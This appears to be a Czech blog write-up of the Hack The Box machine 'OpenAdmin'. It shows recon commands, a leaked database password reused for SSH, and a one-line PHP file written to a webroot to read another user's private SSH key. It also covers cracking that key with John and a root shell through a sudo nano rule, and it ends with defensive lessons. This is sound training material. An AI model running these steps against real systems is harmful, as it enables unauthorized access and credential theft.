---
layout: post
author: Tomáš Matějíček
title: "OpenAdmin"
date: 2020-12-25
tags: linux exploit sudo
---
## Úvod a kontext

OpenAdmin je čistý vícekrokový řetězec: OpenNetAdmin RCE otevře první shell, databázové heslo se znovu používá pro SSH účet `jimmy`, interní localhost-only vhost vydá šifrovaný klíč `joanna` a root nakonec padne na `sudo /bin/nano`.

Na tomhle stroji je důležité nepřeskočit mezikroky. Samotné RCE v ONA nestačí. Skutečný pokrok přichází až ve chvíli, kdy se z jednorázového webového shellu stane stabilní SSH a když se správně přečte vztah mezi `jimmy`, `joanna` a interním webem.

## Počáteční průzkum

### Apache a skrytý OpenNetAdmin

Zvenku jsou vidět jen SSH a Apache. Domovská stránka sama nic neprozrazuje, ale enumerace najde `/artwork/` a `/music/`, odkud se dá přes odkazy dojít až k `/ona/`.
```bash
IP=10.10.10.171;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP
dirb http://openadmin.htb
```
```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

=> DIRECTORY: http://openadmin.htb/artwork/
=> DIRECTORY: http://openadmin.htb/music/
```

Jakmile je `/ona/` nalezené, `whatweb` hned identifikuje OpenNetAdmin. Praktickou roli rychlého HTTP fingerprintingu rozebírám i v článku [WhatWeb](/nastroje/whatweb).
```bash
whatweb http://openadmin.htb/ona/
```
```text
OpenNetAdmin :: 0wn Your Network
```

## Analýza zjištění

### ONA RCE a reuse databázového hesla

`searchsploit` ukáže přímo odpovídající command injection pro OpenNetAdmin 18.1.1. Přes něj lze získat první příkazový kontext a číst lokální soubory aplikace.

Prakticky k tomu, kdy je `searchsploit` jen filtr kandidátů a ne důkaz zranitelnosti, viz i [Searchsploit](/nastroje/searchsploit).
```bash
searchsploit -w opennetadmin
```
```text
OpenNetAdmin 18.1.1 - Remote Code Execution | https://www.exploit-db.com/exploits/47691
```

Po spuštění exploitu je nejdůležitější podívat se do `local/config/database_settings.inc.php`. Tam leží databázové heslo `n1nj4W4rri0R!`, které není jen pro MySQL, ale funguje i pro systémového uživatele `jimmy`.

Je to velmi čistý příklad vzorce rozebraného v článku [Password reuse a rozpad hranic mezi aplikací, SSH, WinRM a admin nástroji](/techniky/password-reuse-a-rozpad-hranic-mezi-aplikaci-ssh-winrm-a-admin-nastroji): credential nalezená v aplikaci sama o sobě ještě není shell, ale její reuse na systémovém účtu už ano.
```text
$ona_contexts['DEFAULT']['databases'][0]['db_login'] = 'ona_sys'
$ona_contexts['DEFAULT']['databases'][0]['db_passwd'] = 'n1nj4W4rri0R!'
```

To je přesně ten moment, kdy se vyplatí přejít na SSH. Místo křehkého webového shellu vznikne plnohodnotný uživatelský přístup.

## Získání přístupu

### `jimmy`, interní vhost a klíč `joanna`

SSH jako `jimmy` samo o sobě ještě nestačí. Lokální konfigurace Apache ale prozradí localhost-only vhost `internal.openadmin.htb` na `127.0.0.1:52846`, který běží pod uživatelem `joanna`.

Je to další praktická ukázka článku [Lokálně dostupné služby po footholdu: localhost není boundary](/techniky/lokalne-dostupne-sluzby-po-footholdu-localhost-neni-boundary): interní web na `127.0.0.1` není po prvním shellu vedlejší detail, ale další vrstva systému, která může vydat přístup pro úplně jiného uživatele.
```text
Listen 127.0.0.1:52846
ServerName internal.openadmin.htb
DocumentRoot /var/www/internal
AssignUserID joanna joanna
```

Nejrozumnější další krok je port forward a využití zapisovatelného webrootu v `/var/www/internal`. Jednoduchý PHP soubor pak vydá privátní klíč `joanna`.
```bash
ssh -L 52846:127.0.0.1:52846 jimmy@openadmin.htb
echo "<?php echo shell_exec('cat /home/joanna/.ssh/id_rsa');" > /var/www/internal/key.php
```

Stažený klíč je zašifrovaný, ale ve webu se zároveň objeví nápověda „Don't forget your "ninja" password“. To je dobrý hint pro `john` a výsledkem je passphrase `bloodninjas`. Praktickou roli `ssh2john` a podobných převodníků rozebírám i v článku [John the Ripper](/nastroje/john-the-ripper).
```bash
/usr/share/john/ssh2john.py OpenAdmin_joanna_id_rsa > OpenAdmin_joanna_id_rsa.john
/usr/sbin/john OpenAdmin_joanna_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
```
```text
=> bloodninjas
```

Pak už jde udělat finální přechod na účet `joanna` a potvrdit user část.
```bash
ssh -i OpenAdmin_joanna_id_rsa joanna@openadmin.htb
cat user.txt
```
```text
__CENSORED__
```

## Eskalace oprávnění

### `sudo /bin/nano`

Na účtu `joanna` už rozhoduje `sudo -l`. Povolený `sudo /bin/nano /opt/priv` vypadá nenápadně, ale `nano` pod `sudo` je v praxi breakout do root shellu. Jakmile běží editor s privilegii roota, stačí využít jeho schopnost spouštět externí příkazy.

Tady tedy nejde o žádnou chybu v kernelu ani v konfiguraci SSH. Root padá čistě na špatně zvoleném `sudo` pravidle.
```bash
sudo -l
```
```text
(root) /bin/nano /opt/priv
```

Po získání root shellu už zbývá jen dočíst `root.txt`.
```bash
cat /root/root.txt
```
```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- OpenAdmin stojí na navazujícím řetězci: ONA RCE, reuse databázového hesla, interní vhost a šifrovaný SSH klíč `joanna`.
- Přechod z `jimmy` na `joanna` je nejdůležitější mezikrok, protože z obyčejného SSH footholdu dělá plnohodnotný uživatelský přístup.
- Root část je další připomínka, že privilegovaný editor v `sudoers` je prakticky totéž co root shell.

## Co si odnést do praxe

- OpenNetAdmin a podobné síťové administrační nástroje musí být aktualizované a ideálně schované z internetu. Na OpenAdmin byla veřejná RCE jen prvním krokem do celého systému.
- Hesla z konfigurací nesmějí fungovat i pro systémové účty. Jakmile stejné tajemství otevře databázi i SSH, je izolace mezi vrstvami pryč.
- `sudo` pravidla na editory, interpretery a obecné utility je potřeba omezit na minimum. Jakmile běžný uživatel spustí `nano` jako root, administrativní hranice fakticky neexistuje.
